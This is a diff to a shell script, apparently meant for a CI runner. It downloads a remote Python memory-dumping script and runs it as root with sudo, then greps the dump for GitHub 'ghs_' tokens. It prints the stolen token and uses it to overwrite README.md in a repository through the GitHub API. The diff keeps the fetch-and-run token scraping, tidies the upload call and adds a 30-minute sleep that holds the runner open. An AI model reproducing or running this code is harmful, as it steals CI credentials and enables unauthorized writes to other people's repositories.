@@ -2,8 +2,7 @@
 set -e
 
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
-TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u `
-# awk 'NR==2' `
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' `
 
 echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL"
@@ -11,7 +10,13 @@ echo "-----------------------------------------------------------------"
 
 #echo "https://api.github.com/repos/${REPO}/contents/README.md"
 
-curl -L --request PUT --url "https://api.github.com/repos/thi3nl0ng/thi3nl0ng.github.io/contents/README.md" --header "Authorization: token $TOKEN_VAL" --header "Accept: application/vnd.github.v3+json" --header "X-GitHub-Api-Version: 2022-11-28" -d '{"message":"my commit message","content":"bXkgbmV3IGZpbGUgY29udGVudHM=", "sha":"SHA_FROM_ABOVE" }'
+curl -L \
+--request PUT \
+--url "https://api.github.com/repos/${REPO}/contents/README.md" \
+--header "Authorization: token $TOKEN_VAL" \
+--header "Accept: application/vnd.github.v3+json" \
+--header "X-GitHub-Api-Version: 2022-11-28" \
+-d '{"message":"my commit message","content":"bXkgbmV3IGZpbGUgY29udGVudHM=", "sha":"SHA_FROM_ABOVE" }'
 
 #curl -L \
 #    -X PUT \
@@ -19,7 +24,8 @@ curl -L --request PUT --url "https://api.github.com/repos/thi3nl0ng/thi3nl0ng.gi
 #    -H "Authorization: token $TOKEN_VAL" \
 #    "https://api.github.com/repos/${REPO}/contents/README.md" \
 #    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
-#sleep 30
+
+sleep 30m
 
 #curl "https://api.github.com/repos/${REPO}/contents/README.md"      
 
